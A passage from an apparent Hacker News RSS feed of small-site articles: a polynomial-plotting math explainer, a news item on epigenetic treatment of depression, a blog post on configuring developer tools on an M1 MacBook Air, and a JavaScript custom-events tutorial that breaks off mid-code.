We would greatly appreciate if you used our domain registrar affiliate links if you find a domain using our service. <a href="https://opencollective.com/askmoe" target="_blank" rel="noreferrer noopener">Donations</a> and affiliate revenue allows us to dedicate more time and resources into building great privacy-focused, free and open source software.
</p>
</div></div>]]>
            </description>
            <link>https://ask.moe/domain</link>
            <guid isPermaLink="false">hacker-news-small-sites-25719007</guid>
            <pubDate>Sun, 10 Jan 2021 20:02:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Trippy Polynomials in Arctangent Scale]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25718994">thread link</a>) | @okaleniuk
<br/>
January 10, 2021 | https://wordsandbuttons.online/trippy_polynomials_in_arctangent_scale.html | <a href="https://web.archive.org/web/*/https://wordsandbuttons.online/trippy_polynomials_in_arctangent_scale.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	
	<p>
This is a cubic parabola.
	</p>
	<p>
x<sup>3</sup> + x<sup>2</sup> - 4x + 2
	</p>
	<canvas id="cubic_on_linear"></canvas>
	<p>
You can see that it intersects the x-axis at least two times, and it has at least one local minimum. However, this is not the whole truth. It intersects the x-axis exactly three times, and it has exactly one minimum and one maximum. The plot fails to show that. You can drag-scroll it to the left or zoom out with shift + mouse wheel to find the missing intersection. The plot is interactive, but it can only show a small piece of <span>ℝ<sup>2</sup></span> space at a time.
	</p>
	<p>
Let's try something different. Instead of a linear scale, let's use the <a href="https://wordsandbuttons.online/arctangent_scale_its_like_the_logarithmic_scale_but_infinite.html">arctangent scale</a>, which displays everything from -∞ to +∞ on a limited square. Now the same plot looks like this.
	</p>
	<canvas id="cubic_on_atan"></canvas>
	
	<p>
Yes, it looks a little unconventional, but you can now see everything.
	</p>
	<p>
You can clearly see that the function's domain (all the possible <span>x</span> values) and range (all the possible <span>y</span> values) are both the whole <span>ℝ</span>. You can see that it has three intersections with the x-axis, one local maximum, and one local minimum. It starts from -∞ and goes to +∞. Arctangent scale leaves no mystery behind, it shows all the juicy stuff about this function right away.
	</p>
	<p>
So let's look at the polynomials using arctangent scale plots.
	</p>
	<h2>
X-axis intersections and roots
	</h2>
	<p>
When a function plot intersects the x-axis, it is the same as.
	</p>
	<p>
ax<sup>3</sup> + bx<sup>2</sup> + bx + d = 0
	</p>
	<p>
In other words, each intersection is a root of a polynomial equation with the right side being <span>0</span>.
	</p>
	<p>
Now let's make our cubic parabola bounce up and down by oscillating its last coefficient.
	</p>
	<p>
x<sup>3</sup> + x<sup>2</sup> - 4x + d
<br>
d ∈ (0, 4)
	</p>
	<canvas id="up_down_cubic_linear"></canvas>
	<p>
The same plot in the arctangent scale looks like this.
	</p>
	<canvas id="up_down_cubic_atan"></canvas>
	<p>
What can you tell about cubic equations by observing this plot?
	</p>
	
	<p>
Now let's oscillate all the coefficiens.
	</p>
	<p>
ax<sup>3</sup> + bx<sup>2</sup> + cx + d
<br>
a ∈ (-1, 1)
<br>
b ∈ (-1, 1)
<br>
c ∈ (-1, 1)
<br>
d ∈ (-1, 1)
	</p>
	<canvas id="bouncy_cubic_atan"></canvas>
	
	<p>
What new do you see?
	</p>
	

	<h2>
<span id="index_symmetric_polynomials">Symmetric polynomials</span>
	</h2>
	<p>
This function is symmetric.
	</p>
	<p>
P(x) = x<sup>2</sup>
	</p>
	<p>
Of course, squaring a number “eats” up its sign so <span>x<sup>2</sup> = (-x)<sup>2</sup></span>. Also, <span>ax<sup>2</sup> = a(-x)<sup>2</sup></span>. And also <span>(ax<sup>i</sup>)<sup>2</sup> = (a(-x)<sup>i</sup>)<sup>2</sup></span>. So every member with an even coefficient is symmetric. The polynomials made up of only the even degree members are symmetric.
	</p>
	<canvas id="bouncy_cubic_symmetric_atan"></canvas>
	
	<p>
What can you tell about symmetric polynomials by observing this plot?
	</p>
	
	<h2>
<span id="index_anti_symmetric_polynomials">Anti-symmetric polynomials</span>
	</h2>
	<p>
This function is anti-symmetric.
	</p>
	<p>
P(x) = x<sup>1</sup>
	</p>
	<p>
In this context, anti-symmetry means that <span>P(x) = -P(-x)</span>. This is, of course, true for <span>ax<sup>1</sup></span> and <span>ax<sup>2i+1</sup></span>.
	</p>
	<p>
Polynomials made of only the anti-symmetric members are anti-symmetric.
	</p>
	<canvas id="bouncy_cubic_antisymmetric_atan"></canvas>
	
	<p>
Which is true about anti-symmetric polynomials?
	</p>
	

	<h2>
Derivatives
	</h2>
	<p>
You only need to know three things about polynomial <a href="https://wordsandbuttons.online/mathematical_analysis_explained_with_python_blood_and_tnt.html#index_derivative">derivatives</a>.
	</p>
	

	<table>
	<tbody><tr>
	<td>
d
	</td>
	<td rowspan="2">
(f(x) + g(x))
	</td>
	<td rowspan="2">
=
	</td>
	<td>
d
	</td>
	<td rowspan="2">
f(x) + 
	</td>
	<td>
d
	</td>
	<td rowspan="2">
g(x)
	</td>
	</tr>
	<tr>
	<td>
dx
	</td>
	<td>
dx
	</td>
	<td>
dx
	</td>
	</tr>
	</tbody></table>

	<table>
	<tbody><tr>
	<td>
d
	</td>
	<td rowspan="2">
k f(x)
	</td>
	<td rowspan="2">
=
	</td>
	<td rowspan="2">
k
	</td>
	<td>
d
	</td>
	<td rowspan="2">
f(x)
	</td>
	</tr>
	<tr>
	<td>
dx
	</td>
	<td>
dx
	</td>
	</tr>
	</tbody></table>
	
	<p>
Now let's get back to our cubic parabola and put its derivative on the same plot.
	</p>
	<canvas id="bouncy_cubic_dx_atan"></canvas>
	
	<p>
What is true about the derivative of a polynomial?
	</p>
	
	<p>
Now let's differentiate it all the way. From a cubic parabola to null.
	</p>
	<canvas id="bouncy_cubic_dddx_atan"></canvas>
	
	<p>
I know, the plot is captivating but this time please concentrate on the coefficients. What do you see?
	</p>
	

	<h2>
<span id="index_maclaurin_series">Maclaurin series</span> and <span id="index_taylor_series">Taylor series</span>
	</h2>
	<p>
We can mimic some other function by measuring some of its derivatives in <span>0</span> and building a polynomial from that.
	</p>
	<p>
This is the exponential function in the arctangent scale.
	</p>
	<canvas id="exponent_atan"></canvas>
	<p>
I choose it as an example since it's the easiest thing to differentiate.
	</p>
	

	<p>
In <span>0</span>, the exponential function equals <span>1</span>, and since it differentiates to itself, all its derivatives in <span>0</span> are <span>1</span>s. How cool is that!
	</p>
	<p>
Ok, so the coefficient before <span>x</span> is the same as the first derivative in <span>0</span>. Which is <span>1</span>. That gives us this.
	</p>
	<p>
P(x) = x + 1
	</p>
	
	<canvas id="exponent_1_atan"></canvas>
	<p>
Well, it doesn't mimic the function well but we're just starting.
	</p>
	<p>
The coefficient before <span>x<sup>2</sup></span> is <span>1 ÷ 2</span>.
	</p>
	
	<canvas id="exponent_2_atan"></canvas>
	<p>
Getting closer. The coefficient before <span>x<sup>3</sup></span> is <span>1 ÷ (2×3)</span>.
	</p>
	<table>
	<tbody><tr>
	<td rowspan="2">
P(x) = 
	</td>
	<td>
1
	</td>
	<td rowspan="2">
x<sup>3</sup> + 
	</td>
	<td>
1
	</td>
	<td rowspan="2">
x<sup>2</sup> + x + 1
	</td>
	</tr>
	<tr>
	<td>
6
	</td>
	<td>
2
	</td>
	</tr>
	</tbody></table>
	<canvas id="exponent_3_atan"></canvas>
	<p>
The next one is before <span>x<sup>4</sup></span> and it's <span>1 ÷ (2×3×4)</span>.
	</p>
	<table>
	<tbody><tr>
	<td rowspan="2">
P(x) = 
	</td>
	<td>
1
	</td>
	<td rowspan="2">
x<sup>4</sup> + 
	</td>
	<td>
1
	</td>
	<td rowspan="2">
x<sup>3</sup> + 
	</td>
	<td>
1
	</td>
	<td rowspan="2">
x<sup>2</sup> + x + 1
	</td>
	</tr>
	<tr>
	<td>
24
	</td>
	<td>
6
	</td>
	<td>
2
	</td>
	</tr>
	</tbody></table>
	<canvas id="exponent_4_atan"></canvas>
	<p>
Let's do one more just to see that it still works.
	</p>
	<table>
	<tbody><tr>
	<td rowspan="2">
P(x) = 
	</td>
	<td>
1
	</td>
	<td rowspan="2">
x<sup>5</sup> + 
	</td>
	<td>
1
	</td>
	<td rowspan="2">
x<sup>4</sup> + 
	</td>
	<td>
1
	</td>
	<td rowspan="2">
x<sup>3</sup> + 
	</td>
	<td>
1
	</td>
	<td rowspan="2">
x<sup>2</sup> + x + 1
	</td>
	</tr>
	<tr>
	<td>
120
	</td>
	<td>
24
	</td>
	<td>
6
	</td>
	<td>
2
	</td>
	</tr>
	</tbody></table>
	<canvas id="exponent_5_atan"></canvas>
	<p>
We can go on forever but we wouldn't. Because, while the approximation or mimicking gets better with every step, it has its limitation. And knowing what we know about polynomials, we should see what it is. A polynomial always starts from ±∞. An exponent starts at <span>0</span>.
	</p>
	<p>
We can approximate it locally with good precision. But due to completely different global behavior, a polynomial will never mimic an exponent completely.
	</p>
	<p>
This way of mimicking functions with polynomials is called the <a href="https://en.wikipedia.org/wiki/Taylor_series#List_of_Maclaurin_series_of_some_common_functions">Maclaurin</a><a> series. We can approximate other functions like this, too. A sine, a cosine, a logarithm. Well, no. We can't do the last one just yet. It isn't defined in 0.
	</a></p><a>
	</a><p><a>
And that's why we need the </a><a href="https://en.wikipedia.org/wiki/Taylor_series">Taylor series</a>. It's the same idea conceptually but with the Taylor series, we can build our target polynomial from the source function derivatives at any point on <span>ℝ</span>. Think of it as a clever hack. We move the source function so the specified point is now <span>0</span>, do the Maclaurin series there, and then shift the target polynomial back.
	</p>
	<p>
This is especially useful given that the series approximation only works well locally. Again, we can't change the global properties of polynomials. But with the Taylor series, we can choose the locality in which we want to mimic a source function the best.
	</p>

	<h2>
Conclusion
	</h2>
	<p>
This page is experimental. I only show the plots and you get to deduce facts all by yourself. So, in a way, it's you who should write a conclusion here.
	</p>
	<p>
From my side, I only hope that the arctangent scale works well as a didactic tool. I hope, since it shows functions as a whole, it shows global polynomial properties good enough. But I haven't had it when I got to learn all of this so I'm not sure if my hopes are valid. 
	</p>
	<p>
If you think that the whole thing could be improved, please write me a note at <a href="mailto:ok@wordsandbuttons.online">ok@wordsandbuttons.online</a>.
	</p>

	

	
	</div></div>]]>
            </description>
            <link>https://wordsandbuttons.online/trippy_polynomials_in_arctangent_scale.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25718994</guid>
            <pubDate>Sun, 10 Jan 2021 20:01:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Treating depression by ‘erasing’ neuroplasticity damage caused by stress]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25718540">thread link</a>) | @circleit
<br/>
January 10, 2021 | https://www.healtheuropa.eu/treating-depression-by-erasing-neuroplasticity-damage-caused-by-stress/104742/ | <a href="https://web.archive.org/web/*/https://www.healtheuropa.eu/treating-depression-by-erasing-neuroplasticity-damage-caused-by-stress/104742/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

        <div><figure><img width="696" height="392" src="https://www.healtheuropa.eu/wp-content/uploads/2021/01/%C2%A9-iStock-ktsimage-696x392.jpg" srcset="https://www.healtheuropa.eu/wp-content/uploads/2021/01/%C2%A9-iStock-ktsimage-696x392.jpg 696w, https://www.healtheuropa.eu/wp-content/uploads/2021/01/%C2%A9-iStock-ktsimage-300x169.jpg 300w, https://www.healtheuropa.eu/wp-content/uploads/2021/01/%C2%A9-iStock-ktsimage-1024x576.jpg 1024w, https://www.healtheuropa.eu/wp-content/uploads/2021/01/%C2%A9-iStock-ktsimage-768x432.jpg 768w, https://www.healtheuropa.eu/wp-content/uploads/2021/01/%C2%A9-iStock-ktsimage-1536x864.jpg 1536w, https://www.healtheuropa.eu/wp-content/uploads/2021/01/%C2%A9-iStock-ktsimage-100x56.jpg 100w, https://www.healtheuropa.eu/wp-content/uploads/2021/01/%C2%A9-iStock-ktsimage-1068x601.jpg 1068w, https://www.healtheuropa.eu/wp-content/uploads/2021/01/%C2%A9-iStock-ktsimage-747x420.jpg 747w, https://www.healtheuropa.eu/wp-content/uploads/2021/01/%C2%A9-iStock-ktsimage.jpg 1920w" sizes="(max-width: 696px) 100vw, 696px" alt="Treating depression by ‘erasing’ neuroplasticity damage caused by stress" title="© iStock-ktsimage"><figcaption>© iStock-ktsimage</figcaption></figure></div>
        <h2>Researchers have used epigenetic modulators in an attempt at ‘erasing’ damage to neuroplasticity caused by stress, showing that acute intervention in epigenetic mechanisms produces antidepressant-like effects more rapidly than conventional drugs.</h2>
<p>Many people living with depression have a form that is resistant to medication, and for those who do respond, sometimes the effects of the medication is not fast enough. To try and overcome these challenges, a group of researchers affiliated with the University of São Paulo (<a href="https://www5.usp.br/" target="_blank" rel="noopener noreferrer">USP</a>) in Brazil tried using epigenetic modulators to “erase” the impact of <a href="https://www.healtheuropa.eu/study-shows-cannabinoid-signalling-vital-for-anxiety-and-stress-levels/96811/">stress</a>.</p>
<p>Exposure to stress, a key trigger of depression, alters certain epigenetic markers in the brain and many of these alterations occur in genes associated with neuroplasticity, which is the brain’s ability to change in response to experience.</p>
<p>The study has been published&nbsp;in the journal&nbsp;<a href="https://www.springer.com/journal/12035" target="_blank" rel="noopener noreferrer"><em>Molecular Neurobiology</em></a>.</p>
<h3>Brain-derived neurotrophic factor</h3>
<p>DNA methylation is increased in genes associated with neuroplasticity when stress is introduced. It is a chromatin remodelling process that regulates gene expression by recruiting proteins involved in gene repression or by inhibiting the binding of transcription factors to DNA. Most existing antidepressants are designed to reduce this process.</p>
<p>The team decided to conduct an in-depth investigation into the action of brain-derived neurotrophic factor (BDNF), a nervous system protein with well-documented effects on the regulation of neuronal plasticity. They tested the hypothesis that stress increases methylation of the gene for BDNF, reducing its expression, which is linked to depressive behaviour.</p>
<p>“Stress reduces expression of BDNF and, as shown in the literature, antidepressants have no effect if BDNF signalling is blocked. That’s why we focused on BDNF,” said Sâmia Joca, a professor at USP and the <a href="https://international.au.dk/" target="_blank" rel="noopener noreferrer">University of Aarhus</a> in Denmark, who is affiliated with the Biomolecular Science Department at USP’s Ribeirão Preto School of Pharmaceutical Sciences (FCFRP).</p>
<p>“Our starting point was this: if we administered a genetic modulator that inhibited DNA methylation, the process wouldn’t happen, BDNF levels would be normal, and there would be an antidepressant effect. If the antidepressant effect is indeed linked to normalisation of the methylation profile, so that conventional drugs take time to work because it takes time to eliminate stress-induced alterations, we imagined that direct modulation of these epigenetic mechanisms would produce the effect rapidly. We found this was indeed the case.</p>
<p>“We tested two drugs, one of which is used to <a href="https://www.healtheuropa.eu/mathematical-theory-help-to-treat-cancer/94424/">treat cancer</a> (gliomas). The other is completely experimental. It’s important to note that these drugs can’t be used to treat depression because if they reduce DNA methylation unrestrictedly, they’ll increase the expression of several genes rather than just the gene that interests us. So, there will be adverse effects. The findings point not to prospects for novel antidepressants but to an interesting angle from which to develop novel treatments.”</p>
<p>The study was a continuation of the work Joca and her team have been doing for several years.</p>
        </div></div>]]>
            </description>
            <link>https://www.healtheuropa.eu/treating-depression-by-erasing-neuroplasticity-damage-caused-by-stress/104742/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25718540</guid>
            <pubDate>Sun, 10 Jan 2021 19:22:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The M1 MacBook Air is the best computer I've ever owned]]>
            </title>
            <description>
<![CDATA[
Score 214 | Comments 318 (<a href="https://news.ycombinator.com/item?id=25717727">thread link</a>) | @bouk
<br/>
January 10, 2021 | https://bou.ke/blog/macbouk-air/ | <a href="https://web.archive.org/web/*/https://bou.ke/blog/macbouk-air/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>
  
  <p><span>Jan 2021</span></p>
  <p>I started a new job recently so I had the opportunity to get one of the new M1 MacBooks, I decided to go with the Air. The reviews have been very positive and I’m here to tell you: it is indeed an amazing device. The performance feels a lot better than my MacBook Pro 16”, which is only a year old and about 3x the price.</p>

<p>When I got the Mac I set out with the goal of avoiding Intel builds of software as much as possible and using native whenever possible unless it’s absolutely impossible.</p>

<h2 id="nix">Nix</h2>

<p>I have my <a href="https://github.com/bouk/b" target="_blank">whole system configuration</a> stored in <a href="https://bou.ke/blog/nix/">Nix</a>, which was the thing that I least expected to work and arm64 support is still a <a href="https://github.com/NixOS/nixpkgs/issues/95903" target="_blank">work in progress</a>. I could install the <code>x86_64</code> build of Nix and run it under Rosetta but wanted to avoid that, so I went back to my old pal;</p>

<h2 id="homebrew">Homebrew</h2>

<p>This was one of the first things I installed and got working, when I did it I had to install it into <code>/opt/homebrew</code> manually and install everything with the <code>--source</code> flag but… everything mostly worked? Lots of props to the Homebrew team for getting everything running so quickly, with some amazing <a href="https://github.com/Homebrew/brew/issues/7857" target="_blank">open-source project management</a> the community worked together very quickly to support most of the software that Homebrew offers. There’s still some software that doesn’t work—notably neovim. But I’m sure that will be fixed soon.</p>

<p>The installer now installs into <code>/opt/homebrew</code> by default and there’s prebuilt bottles of most packages, so the Homebrew experience is great.</p>

<h2 id="go">Go</h2>

<p>A lot of my work involves Go, and I depend on a lot of tools written in Go. I was happy to see that the <a href="https://blog.golang.org/ports" target="_blank">Go team was on top of it</a> and released the 1.16 beta quite quickly, which is what is installed right now when you do <code>brew install go</code>. I’ve had no issues with it and am enjoying some of the new features like <a href="https://github.com/golang/go/issues/41191" target="_blank">file embedding</a>. GoLand was also <a href="https://blog.jetbrains.com/go/2020/12/30/goland-2020-3-1-is-out/" target="_blank">updated</a> to support M1 pretty quickly.</p>

<h2 id="terraform">Terraform</h2>

<p>Terraform I had the most issues with since using it depends on a bunch of plugins, which are generally only available for x86_64. This won’t change until Go 1.16 has been released. So here I had to resort to building for x86_64, which is easy to do:</p>

<div><div><pre><code>curl -L 'https://github.com/hashicorp/terraform/archive/v0.14.4.tar.gz' | tar -xzf-
cd terraform-0.14.4/
GOARCH=amd64 go build -o ~/bin/terraform
</code></pre></div></div>

<p>And now Terraform will just use plugin built for Intel. I assume that most Terraform plugins will support arm64 very quickly after Go 1.16 is out.</p>

<h2 id="rust-and-universal-binaries">Rust and Universal Binaries</h2>

<p>I use <a href="https://github.com/alacritty/alacritty" target="_blank">Alacritty</a> as my terminal. It supported <code>arm64</code> pretty quickly but the current build for it doesn’t include it, so I <a href="https://github.com/alacritty/alacritty/pull/4683" target="_blank">made a PR</a> that will build a universal binary. Creating a universal binary for Rust is quite easy:</p>

<div><div><pre><code>rustup target add x86_64-apple-darwin aarch64-apple-darwin
cargo build <span>--release</span> <span>--target</span><span>=</span>x86_64-apple-darwin
cargo build <span>--release</span> <span>--target</span><span>=</span>aarch64-apple-darwin
lipo target/<span>{</span>x86_64,aarch64<span>}</span><span>-apple-darwin</span>/release/alacritty <span>-create</span> <span>-output</span> alacritty
</code></pre></div></div>

<p>Running <code>file alacritty</code> will now show you something like:</p>

<div><div><pre><code>alacritty: Mach-O universal binary with 2 architectures: [x86_64:Mach-O 64-bit executable x86_64] [arm64]
alacritty (for architecture x86_64):    Mach-O 64-bit executable x86_64
alacritty (for architecture arm64):     Mach-O 64-bit executable arm64
</code></pre></div></div>

<p>Now you can run it in either <code>x86_64</code> mode with <code>arch -x86_64 alacritty</code> or natively with <code>arch -arm64 alacritty</code> and the OS will automatically select the right binary.</p>

<p>Building a universal binary for a Go application is similarly easy:</p>

<div><div><pre><code>GOARCH=amd64 go build -o app_amd64 main.go
GOARCH=arm64 go build -o app_arm64 main.go
lipo app_{amd64,arm64} -create -output app
</code></pre></div></div>

<h2 id="windows-and-games">Windows and Games</h2>

<p>There’s a couple of <a href="https://en.wikipedia.org/wiki/Age_of_Mythology" target="_blank">games</a> I’ve been playing for a long time that I still need on any computer I get, but they’re 32-bit Windows-only. This was something that was surprisingly easy to get working:</p>

<ol>
  <li>Install the <a href="https://www.parallels.com/blogs/parallels-desktop-apple-silicon-mac/" target="_blank">Parallels Technical Preview</a></li>
  <li>Sign up for Windows Insider and download the <a href="https://www.microsoft.com/en-us/software-download/windowsinsiderpreviewARM64" target="_blank">Windows 10 on ARM Insider Preview</a></li>
  <li>Install it into Parallels</li>
  <li>Done</li>
</ol>

<p>Now you can download Steam and basically install anything and it will probably work. Microsoft really did some amazing magic in getting both 32-bit and 64-bit x86 programs running on <code>arm64</code>.</p>

<p><img src="https://bou.ke/images/windows-solitaire.png" alt="" loading="lazy"></p><h2 id="conclusion">Conclusion</h2>

<p>Somehow Apple has created the best PC in every category at once. It is even the best Windows PC, despite the multiple layers of emulation that are happening. The battery life is incredible, I haven’t experienced any slowdowns, I don’t hear any fans spin up (because there are none). It’s hard not to be excited about this.</p>

<p>If Apple chose to go down this path, they could dominate the server space if they took their magic chips, put it in a <a href="https://en.wikipedia.org/wiki/Rack_unit" target="_blank">rack unit</a> and made it easy to install Linux onto it. Intel is completely screwed unless they come up with something better, fast.</p>

  <hr>
  <p>You should follow me on <a href="https://twitter.com/BvdBijl">Twitter</a>!</p>
</div>
</div></div>]]>
            </description>
            <link>https://bou.ke/blog/macbouk-air/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25717727</guid>
            <pubDate>Sun, 10 Jan 2021 18:24:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Handling Custom Events in JavaScript]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25717694">thread link</a>) | @icelandico_
<br/>
January 10, 2021 | https://michalmuszynski.com/blog/custom-events-in-javascript/ | <a href="https://web.archive.org/web/*/https://michalmuszynski.com/blog/custom-events-in-javascript/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>JavaScript is full of events. They are one of the most important features of this language. There are many already existing, built-in events we can use. The most popular probably are:
click, mousemove, keyup, change, submit, etc. The full list you can find on MDN <a href="https://developer.mozilla.org/en-US/docs/Web/Events" target="_blank">documentation page</a>.</p>
<p>Events are a good way to interact with elements existing in our application or handle actions performed by users.</p>
<p>However, we can encounter the situation when we want to call a function after a certain block of code is executed. Or trigger one of the built-in events manually. In this article, I would like to show some cases when <code>Event()</code> and <code>CustomEvent()</code> constructors are useful.</p>
<h2>Creating and dispatching events</h2>
<p>Let's consider the following situation. We are changing the input value dynamically, with the script.</p>
<h4><code>index.html</code></h4>
<div data-language="html"><pre><code><span><span><span>&lt;</span>input</span> <span>class</span><span><span>=</span><span>"</span>form__input<span>"</span></span> <span>value</span><span><span>=</span><span>"</span><span>"</span></span> <span>/&gt;</span></span>
<span><span><span>&lt;</span>button</span> <span>class</span><span><span>=</span><span>"</span>form__change<span>"</span></span><span>&gt;</span></span>Change data<span><span><span>&lt;/</span>button</span><span>&gt;</span></span></code></pre></div>
<h4><code>script.js</code></h4>
<div data-language="javascript"><pre><code><span>const</span> inputEl <span>=</span> document<span>.</span><span>querySelector</span><span>(</span><span>'.form__input'</span><span>)</span><span>;</span>
<span>const</span> buttonEl <span>=</span> document<span>.</span><span>querySelector</span><span>(</span><span>'.form__change'</span><span>)</span><span>;</span>

inputEl<span>.</span><span>addEventListener</span><span>(</span><span>'change'</span><span>,</span> <span>e</span> <span>=&gt;</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>'New value'</span><span>,</span> e<span>.</span>target<span>.</span>value<span>)</span><span>;</span>
<span>}</span><span>)</span><span>;</span>

buttonEl<span>.</span><span>addEventListener</span><span>(</span><span>'click'</span><span>,</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
  inputEl<span>.</span>value <span>=</span> <span>'Example value'</span><span>;</span>
<span>}</span><span>)</span><span>;</span></code></pre></div>
<p>In this situation, the <code>change</code> event <em>won't</em> be triggered. We have to trigger it manually. Here, the <code>Event()</code> constructor comes in. Creating an event is simple:</p>
<p><code>const newEvent = new Event('change');</code> </p>
<p>Now we have to dispatch this event on the element:</p>
<p><code>inputEl.dispatchEvent(newEvent);</code></p>
<p>The string with the event name we put into <code>Event()</code> constructor parameter must be the same as the one given in <code>addEventListener</code>.
So to trigger the <code>change</code> event on the input we need to add these two lines in the proper place in our code.</p>
<h4><code>script.js</code></h4>
<div data-language="javascript"><pre><code>buttonEl<span>.</span><span>addEventListener</span><span>(</span><span>'click'</span><span>,</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
  inputEl<span>.</span>value <span>=</span> <span>'Example value'</span><span>;</span>
  <span>const</span> changeEvent <span>=</span> <span>new</span> <span>Event</span><span>(</span><span>'change'</span><span>)</span><span>;</span>
  inputEl<span>.</span><span>dispatchEvent</span><span>(</span>changeEvent<span>)</span>
<span>}</span><span>)</span><span>;</span></code></pre></div>
<p>Now, the <code>change</code> event will be triggered on the input.
As mentioned above, the names of our events are not limited to names that are already built-in in JavaScript.
This will work as long as we pass the same event name in the <code>Event()</code> constructor and <code>addEventListener</code>.</p>
<div data-language="javascript"><pre><code><span>const</span> myEvent <span>=</span> <span>new</span> <span>Event</span><span>(</span><span>'myEventName'</span><span>)</span><span>;</span>
inputEl<span>.</span><span>addEventListener</span><span>(</span><span>'myEventName'</span><span>,</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>{</span><span>...</span><span>}</span><span>)</span><span>;</span></code></pre></div>
<h2>Dispatching events with data</h2>
<p>It's not all. Apart from creating, dispatching, and listening for custom events, there is the possibility to add data to the event object. If we want to pass data with the event, we have to use <code>CustomEvent()</code> constructor.</p>
<h4><code>modal.html</code></h4>
<div data-language="html"><pre><code><span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>"</span>modal<span>"</span></span><span>&gt;</span></span>
  <span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>"</span>modal-content<span>"</span></span><span>&gt;</span></span>
    Modal content...
  <span><span><span>&lt;/</span>div</span><span>&gt;</span></span>

  <span><span><span>&lt;</span>button</span> <span>class</span><span><span>=</span><span>"</span>modal-close<span>"</span></span><span>&gt;</span></span>Close<span><span><span>&lt;/</span>button</span><span>&gt;</span></span>
<span><span><span>&lt;/</span>div</span><span>&gt;</span></span></code></pre></div>
<h4><code>modal.js</code></h4>
<div data-language="javascript"><pre><code><span>const</span> buttonElement <span>=</span> document<span>.</span><span>querySelector</span><span>(</span><span>'.modal-close'</span><span>)</span>
<span>const</span> modal <span>=</span> document<span>.</span><span>querySelector</span><span>(</span><span>'.modal'</span><span>)</span><span>;</span>

buttonElement<span>.</span><span>addEventListener</span><span>(</span><span>'click'</span><span>,</span> <span>(</span><span>)</span> <span>=&gt;</span> modal<span>.</span><span>dispatchEvent</span><span>(</span>closeModalEvent<span>)</span><span>)</span>

<span>const</span> userData <span>=</span> <span>{</span>
  name<span>:</span> <span>'Joe'</span><span>,</span>
  lastName<span>:</span> <span>'Doe'</span><span>,</span>
  age<span>:</span> <span>50</span>
<span>}</span><span>;</span>

<span>const</span> closeModalEvent <span>=</span> <span>new</span> <span>CustomEvent</span><span>(</span><span>'closeModal'</span><span>,</span> <span>{</span>
  bubble<span>:</span> <span>true</span><span>,</span>
  detail<span>:</span> <span>{</span>
    modalId<span>:</span> <span>1</span><span>,</span>
    data<span>:</span> userData
  <span>}</span><span>,</span>
  cancelable<span>:</span> <span>true</span>
<span>}</span><span>)</span><span>;</span>

modal<span>.</span><span>addEventListener</span><span>(</span><span>'closeModal'</span><span>,</span> <span>e</span> <span>=&gt;</span> console<span>.</span><span>log</span><span>(</span>e<span>.</span>detail<span>)</span><span>)</span><span>;</span></code></pre></div>
<p>In the above example, the detail object will be dispatched after the modal is closed with the button. You can receive the data in other places in your code and handle further actions.
As you can see I passed two additional properties besides the <code>detail</code>. These are:
<code>bubble</code> - decides whether the event has to be captured by the parent element. The default value is set to <code>false</code>.
<code>cancelable</code> - defines if it's possible to cancel the event. The default value is set to <code>false</code>.</p>
<h2>Browser compatibility</h2>
<p><code>CustomEvent()</code> is available in all major browsers except the Internet Explorer. For this browser you can use a polyfill. It can be found <a href="https://developer.mozilla.org/en-US/docs/Web/API/CustomEvent/CustomEvent" target="_blank">on MDN</a>.
Basically we haveto use <code>createEvent</code> and <code>initEvent</code>.</p>
<div data-language="javascript"><pre><code><span>var</span> element <span>=</span> document<span>.</span><span>getElementByClassName</span><span>(</span><span>'.input'</span><span>)</span><span>;</span>
<span>var</span> customEvent <span>=</span> document<span>.</span><span>createEvent</span><span>(</span><span>'Event'</span><span>)</span><span>;</span>
customEvent<span>.</span><span>initEvent</span><span>(</span><span>'customEvent'</span><span>)</span><span>;</span>

element<span>.</span><span>addEventListener</span><span>(</span><span>'customEvent'</span><span>,</span> <span>function</span><span>(</span><span>e</span><span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>'Event'</span><span>,</span> e<span>)</span>
<span>}</span><span>,</span> <span>false</span><span>)</span><span>;</span>

element<span>.</span><span>dispatchEvent</span><span>(</span>customEvent<span>)</span><span>;</span></code></pre></div>
<h2>Custom EventEmitter functionality</h2>
<p>At the end of this article, I want to show a simple solution that I use when it comes to handling custom events.
I prefer to make utility functions for functionalities that are used in different places in our code multiple times. To avoid creating new events with the constructor I created an object which can be imported into any desired place in your code.</p>
<p>This code is based on a few custom EventEmitters tutorials I found while looking for a custom EventEmitter.</p>
<h3><code>eventEmitter.js</code></h3>
<div data-language="javascript"><pre><code><span>const</span> EventEmitter <span>=</span> <span>{</span>
  events<span>:</span> <span>{</span><span>}</span><span>,</span>
  <span>dispatch</span><span>:</span> <span>function</span><span>(</span><span>event<span>,</span> data</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>!</span><span>this</span><span>.</span>events<span>[</span>event<span>]</span><span>)</span> <span>return</span>
    <span>this</span><span>.</span>events<span>[</span>event<span>]</span><span>.</span><span>forEach</span><span>(</span><span>callback</span> <span>=&gt;</span> <span>callback</span><span>(</span>data<span>)</span><span>)</span>
  <span>}</span><span>,</span>
